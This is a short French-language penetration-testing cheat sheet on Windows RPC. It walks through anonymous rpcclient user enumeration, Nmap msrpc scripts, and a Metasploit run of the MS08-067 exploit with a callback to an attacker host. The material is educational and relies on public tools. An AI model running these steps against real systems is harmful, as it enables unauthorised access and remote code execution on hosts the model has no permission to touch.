# Exploitation RPC (Remote Procedure Call)

## Objectif
Exploiter des faiblesses de configuration ou des vulnérabilités RPC pour obtenir des informations sensibles ou exécuter du code à distance.

---

## Explications vulgarisées
- RPC permet à des programmes de communiquer à distance. Sur Windows, il est utilisé pour de nombreux services (partages, gestion AD, etc.). Des failles ou de mauvais réglages peuvent permettre un accès non autorisé ou une exécution de code.

---

## Commandes et étapes essentielles

### 1. Enumération des services RPC
```bash
rpcclient -U "" target.com
```
- **rpcclient** : Outil pour interroger les services RPC sur une machine Windows.
- **-U ""** : Connexion anonyme.
- **Exemple de sortie** :
```
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
```
- **À surveiller** : Comptes admin, utilisateurs, groupes.

### 2. Enumération automatisée avec Nmap
```bash
nmap -p 135 --script msrpc-enum,msrpc-info target.com
```
- **msrpc-enum** : Enumère les interfaces RPC.
- **msrpc-info** : Récupère des infos sur les services RPC.

### 3. Exploitation de failles connues (ex : MS03-026, MS08-067)
- Utiliser Metasploit ou des scripts publics pour exploiter des vulnérabilités RPC.
- Exemple :
```bash
msfconsole
use exploit/windows/smb/ms08_067_netapi
set RHOSTS target.com
set LHOST attacker_ip
run
```

---

## Conseils pour débutants
- Toujours commencer par l'énumération anonyme avant d'essayer des credentials.
- Attention aux crashs ou blue screens sur les cibles vulnérables.
- Lire la documentation de chaque outil pour découvrir des options avancées.

---

## Pour aller plus loin
- [PayloadsAllTheThings - RPC](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/RPC%20Methodology)
- [Nmap RPC NSE Scripts](https://nmap.org/nsedoc/categories/rpc.html) 